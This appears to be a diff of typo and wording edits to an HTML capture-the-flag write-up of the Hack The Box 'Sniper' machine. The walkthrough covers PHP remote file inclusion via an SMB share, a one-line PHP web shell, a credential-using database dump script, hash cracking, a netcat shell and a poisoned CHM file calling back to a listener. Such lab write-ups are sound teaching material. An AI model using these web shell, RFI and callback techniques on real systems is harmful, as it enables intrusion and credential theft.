@@ -6,9 +6,7 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it.
- First up, from my standard nmap scan, we see :
-nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151 Nmap scan report for 10." />
+<meta name="description" content="Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
 <meta name="keywords" content="HTB, Hack the Box" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://5ysk3y.github.io/htb/guides/sniper/" />
@@ -41,9 +39,7 @@ nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151 Nmap scan report for 10." />
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Sniper [Medium] - Windows :: 5ysk3y Pwnz">
-<meta property="og:description" content="Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it.
- First up, from my standard nmap scan, we see :
-nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151 Nmap scan report for 10." />
+<meta property="og:description" content="Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
 <meta property="og:url" content="https://5ysk3y.github.io/htb/guides/sniper/" />
 <meta property="og:site_name" content="Sniper [Medium] - Windows" />
 <meta property="og:image" content="https://5ysk3y.github.io/">
@@ -154,7 +150,7 @@ nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151 Nmap scan report for 10." />
   
 
   <div class="post-content"><div>
-        <p>Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&rsquo;s take a look at how I did it.</p>
+        <p>Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&rsquo;s referenced and included as a gist for your viewing.</p>
 <hr>
 <p>First up, from my standard nmap scan, we see :</p>
 <pre><code>nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151
@@ -225,7 +221,8 @@ OS and Service detection performed. Please report any incorrect results at https
 <p>http://10.10.10.151/blog/
 http://10.10.10.151/user/</p>
 <p>The blog itself doesnt appear to be built on any CMS framework; the only significant thing I can see thus far is that it has the ability to interchange languages via a PHP URL arugment. Took a copy of such a request and fed it to SQLMap for examination. It doesnt appear to have been able to find any injection points.</p>
-<p>I&rsquo;m also running full dirb scans of the /blog and /user URL&rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the loggin cookie associated with my registration.</p>
+<p>I&rsquo;m also running full dirb scans of the /blog and /user URL&rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the login cookie associated with my registration.
+nd doesn&rsquo;t it give further results because of its presence</p>
 <pre><code> ~/HTB/Boxes/Sniper/dirb cat sniper_initial.dirb | grep 200 | sort | uniq -i
 /blog (Status: 200)
 /index.php (Status: 200)
@@ -236,9 +233,9 @@ http://10.10.10.151/user/</p>
 <p>Where <!-- raw HTML omitted --> is (e.g.) en, fr, es. I&rsquo;ve attempted to fuzz the lang part of the request; including the index.php page forces the page to include itself and that basically breaks the application for that particular load. I&rsquo;ve also tried fuzzing for .aspx and asp, as theyre common IIS file types, nothing has come back from there.</p>
 <p>After browsing around to see how this can be exploited, it turns out theres a particular vulnerability to allow exploiting of RFI in conjunction with PHP and SMB:</p>
 <p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">RFI using PHP/SMB</a></p>
-<p>This effectively uses a PHP exploit that invovles including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&rsquo;ve setup an SMB share on my own host as per that server. In the  share I&rsquo;ve got a file called hax.php (yes, I know, Its leet). It contains this:</p>
+<p>This effectively uses a PHP exploit that involves including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&rsquo;ve setup an SMB share and inside it I&rsquo;ve got a file called hax.php (yes, I know, Its leet). It contains this:</p>
 <p><code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
-<p>For posterity the following also reflects the codeblock used in my smb.conf file:</p>
+<p>For posterity the following reflects the codeblock used in my smb.conf file:</p>
 <pre><code>[share]
 path = /var/www/html/pub
 writable = no
@@ -273,7 +270,7 @@ force user = nobody
 10/01/2019  08:42 AM             7,192 registration.php
 08/14/2019  10:35 PM             7,004 registration_old123123123847.php
 04/11/2019  05:23 AM    &lt;DIR&gt;          vendor
-</code></pre><p>Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&ndash; specifically it told us the table that gets inserted.. On top of that, the db.php file contains a connection a full connection statement (added to creds) that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:</p>
+</code></pre><p>Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&ndash; specifically it tells us the table that data gets inserted into. On top of that, the db.php file contains a full connection statement (added to creds) that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:</p>
 <pre><code>&lt;?php
 $con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;);
 $query = &quot;SELECT * from users&quot;;
@@ -283,7 +280,7 @@ while($output = mysqli_fetch_array($result)) {
 		print_r($output);
 }
 ?&gt;
-</code></pre><p>Fairly self explanatory; I lifted the $con variable from db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two of interest (for reasons) are my own login info (via the test account I registered with):</p>
+</code></pre><p>Fairly self explanatory; I lifted the $con variable from db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two users of interest (for reasons) are my own login info (via the test account I registered with):</p>
 <pre><code>Array
 (
 	[0] =&gt; 12
@@ -297,7 +294,7 @@ while($output = mysqli_fetch_array($result)) {
 	[4] =&gt; 2019-10-14 01:54:13
 	[trn_date] =&gt; 2019-10-14 01:54:13
 )
-</code></pre><p>And the superuser password:</p>
+</code></pre><p>And the superuser password hash:</p>
 <pre><code>Array
 (
 	[0] =&gt; 1
@@ -312,7 +309,7 @@ while($output = mysqli_fetch_array($result)) {
 	[trn_date] =&gt; 2019-04-11 22:45:36
 )
 </code></pre><p>There are more, likely from signups from other HTB users, so I&rsquo;ve dumped them all into interesting. I grabbed my own to see if I can identify and crack its hash (since I know what the pass is) before I move onto super user.</p>
-<p>Also, using Hax.php, to enum the user for this box:</p>
+<p>Also, I have used my wrapper script to enum the users on this box:</p>
 <pre><code>04/09/2019  06:47 AM    &lt;DIR&gt;          Administrator
 04/11/2019  07:04 AM    &lt;DIR&gt;          Chris
 
@@ -321,7 +318,7 @@ while($output = mysqli_fetch_array($result)) {
 <p>So its an MD5 hash. Lets try to crack our own! Hashcat got it:</p>
 <pre><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
 5f4dcc3b5aa765d61d8327deb882cf99:password
-</code></pre><p>Sadly the sysadmin password didnt seem to crack quite as easily (john is at it as we speak) - SSH port isnt open on the server so its likely we will need to priv esc, meaning the sooner we can get a stable shell, away from the web shell were currently using, the better.</p>
+</code></pre><p>Sadly the sysadmin password didnt seem to crack quite as easily (john is at it as we speak) - SSH isnt available on this server as it&rsquo;s a Windows box, so its likely we will need to priv esc, meaning the sooner we can get a stable shell, away from the web shell were currently using, the better.</p>
 <p>In order to get a stable shell, I had to supply my own netcat binary to Windows and then use that directly. Specifically:</p>
 <ol>
 <li>Upload nc64 (windows netcat, using this specific command):</li>
@@ -393,7 +390,6 @@ sqlsodbc.chm                                                C:\Windows\Help\mui\
 &lt;SCRIPT&gt;
   x.Click();
 &lt;/SCRIPT&gt;
-
 </code></pre><p>For me, getting this to actually work was massively hit and miss. A good test before running this is to get the box to ping you via <code>ping -n 2 &lt;IP.ADDRESS&gt;</code></p>
 <p>Once confirmed I compiled the CHM with the nc64.exe line and moved it into C:\Docs - with a listener running, we get a call back:</p>
 <pre><code>skynet Boxes/Sniper » nc -nlvp 9003
